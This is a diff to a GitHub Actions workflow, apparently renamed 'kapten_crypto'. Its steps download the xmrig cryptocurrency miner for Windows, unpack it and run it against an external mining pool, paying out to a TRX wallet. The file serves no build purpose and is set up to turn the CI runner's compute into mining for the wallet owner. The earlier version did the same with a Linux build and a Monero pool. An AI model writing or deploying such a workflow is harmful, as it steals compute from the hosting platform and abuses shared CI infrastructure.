@@ -1,4 +1,4 @@
-name: ALBASHA 
+name: kapten_crypto 
 
  
 
@@ -10,7 +10,7 @@ jobs:
 
 build: 
 
-name: ALBASHA
+name: kapten_crypto 
 
 runs-on: windows-latest 
 
@@ -36,15 +36,15 @@ steps:
 
 - name: DOWNLOAD 
 
-run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz -OutFile xmrig-6.15.0-linux-static-x64.tar.gz 
+run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-msvc-win64.zip -OutFile xmrig-6.15.1-msvc-win64.zip 
 
 - name: Extract 
 
-run: Expand-Archive xmrig-6.15.0-linux-static-x64.tar.gz
+run: Expand-Archive xmrig-6.15.1-msvc-win64.zip 
 
 - name: Running 
 
-run: .\xmrig-6.15.0-linux-static-x64.tar\xmrig-6.15.0\./xmrig --opencl --cuda -o xmrpool.eu:9999 -u 86isnG9btQG5syz1in1VRNBZqpMk72F1jSJK41wbHgCMCbhVyK7mMN14sba5jpMiZybi7QiHPCofk9aMuz4BoNDdLwH1Qye -k --tls 
+run: .\xmrig-6.15.1-msvc-win64\xmrig-6.15.1\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u TRX:TYLQBaiebjDPU3q5TkVtjLjHfPPwbGZgqe.ALBASHA -p x -t 1 
 
 - name: END 
 
